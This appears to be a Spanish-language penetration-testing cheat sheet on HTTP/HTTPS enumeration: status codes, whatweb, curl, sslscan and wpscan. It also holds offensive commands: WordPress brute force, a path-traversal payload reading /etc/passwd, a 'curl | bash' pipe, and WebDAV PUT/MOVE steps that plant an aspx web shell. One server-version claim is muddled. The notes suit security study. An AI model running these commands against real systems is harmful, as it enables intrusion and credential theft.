# HTTP ❮❯

Tags: #Web #Puerto #Reconocimiento #Escaneo #CMS #Comandos 

## Codigos de estado 
200 -> OK
301 -> Moved Permanently (Follow Redirect)
401 -> Unauthorized
403 -> Forbidden
404 -> Not Found

Si la versión del servidor HTTP es “**Apache httpd 2.4.46 o HTTP nginx 1.18.0**“, podemos determinar que el sistema está ejecutando una distribución de Ubuntu. El número de versión “**httpd 2.4.46 o nginx 1.18.0**” se refiere a la revisión específica del paquete de SSH en esa distribución de Ubuntu. A partir de esto, podemos identificar el **codename** de la distribución de Ubuntu, que en este caso sería “**Focal**” para Ubuntu 20.04.
Todas estas búsquedas las aplicamos sobre el siguiente dominio:
-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

80 - Este puerto es el que se usa para la navegación web de forma no segura HTTP. 

### Rutas tipicas
**/var/www/html** Ruta tipica de Apache o Nginx
**/opt/blog/server.js** Ruta por default de Node.js
**/wp-admin.php** Es la ruta del panel de autenticacion de WordPress
**/wp-login.php** Es la ruta del panel de autenticacion de WordPress


❯ **Ctrl + u** Para ver el codigo fuente de la pagina web
❯ **Ctrl + r** Recargar la pagina web
❯ **Ctrl + Shift + c** Para inspeccionar el codigo 

❯ **whatweb ❮http://IP❯**  -> Nos dara una breve descripcion del gestor de contenidos del puerto 80
- Mirar la jQuery
- Servidor Web
❯ **whatweb ❮http://IP:PORT❯** -> Nos dara una breve descripcion del gestor de contenidos por un puerto especifico
❯ **whatweb \http://❮IP❯ -v**  v=Miramos las cabeceras de la pagina web, las cuales aveces nos revelan cosas

❯ **curl ❮IP❯ | bash** Lo que hace Curl es obtener un **index.html** del servidor y despues con el bash haremos que nos interprete la data en bash
❯ **wget \http://❮IP❯/❮File❯** Para poder cargar o descargar un archivo especifico desde una IP


# HTTPS ❮❯
443 - Este puerto es también para la navegación web, pero en este caso usa el protocolo HTTPS que es seguro y utiliza el protocolo TLS por debajo.

❯ **openssl s_client -connect ❮IP❯:443** Para conectarnos al openssl e inspeccionar el certificado del puerto 443
❯ **sslscan ❮IP❯:8443** Te da informacion del ssl de la maquina y si detecta alguna vulnerabilidad te la representa, podemos colocar el puerto si no es el comun 443













- **/wp-json/wp/v2/users/** Reporta usuarios validos en la pagina de WordPress en formato Json
- **cat wp-config.php | less** Este archivo suele disponer de credenciales de acceso a la base de datos, file que se encuentra dentro de la maquina victimas y lo miramos en formato de pagina
- Comando -> **wpscan --url <http://URL/>** Detecta vulnerabilidades, pluggins en un wordPress
- Comando -> **wpscan --url <http://URL/> --enumerate u** Enumeras usuarios que puedan existir en un WordPress
- Comando -> **wpscan --url <http://URL/> -U < USER> -P <Dicc.txt>** Aplicas fuerza bruta, en donde colocas el usuario y en este caso el diccionario de las passwd 
	Tmabien podemos usar **wpseku github security scanner**  o **wordpressscan github**, pero la 'mejor' es wpseku 
- Dentro de un WP podemos editar ese template y colocar un comando. Appearance ->Editor -> 404 Template

- /usr/share/davtest/backdoors/**aspx_cmd.aspx**   Ejecutable que al momento de ejecutarse en una pagina Web, nos dara una WebShell

- Comando -> **curl http://< IP> -v** Haremos que nos ejecute un curl para poder ver la cabeceras de la pagina solicitada y su data


- Comando -> **curl -s -X GET "http://< IP>" -I** Miramos las cabeceras de la pagina web (I=i mayuscula,s=silence)
- Comando -> **curl -s -X GET http://< IP>/?p=404** Apuntas a una ruta 404 y haces la peticion
- Comando -> **curl -s -X PUT http://< IP>/file.txt -d @file.txt** Para subir un archivo a una pagina web con un comando a la url que lo indicaremos con el @, este archivo debe tener una extencion especifica y permitida por el webdav. El example.txt en la url es el que debe de tener una extencion permitida.
En este caso para ver mejor el contenido de arriba por Burpsuite, aplicamos el siguiente comando
- Comando -> **curl -s -X POST http://< IP>/fielRead.php -d 'file=./.list/....//....//....//....//etc/passwd'** Miramos la resuesta por POST de la pagina web, y a nivel de (d=data) le pasamos eso 
	- fileRead.php -> lo buscamos en el BurpSuite en la cabecera de POST
- Comando -> **curl -s -X MOVE -H “Destination:http://< URL>/cmd.aspx” http://< URL>/cmd.txt** Moveremos el archivo que subimos con extension .txt ya que no puede ser interpretado y le aplicaremos un renombramiento colocandole su extrension .aspx y lo haremos con la cabecera destination. Esto no dara una terminal en la web. (s=silence)
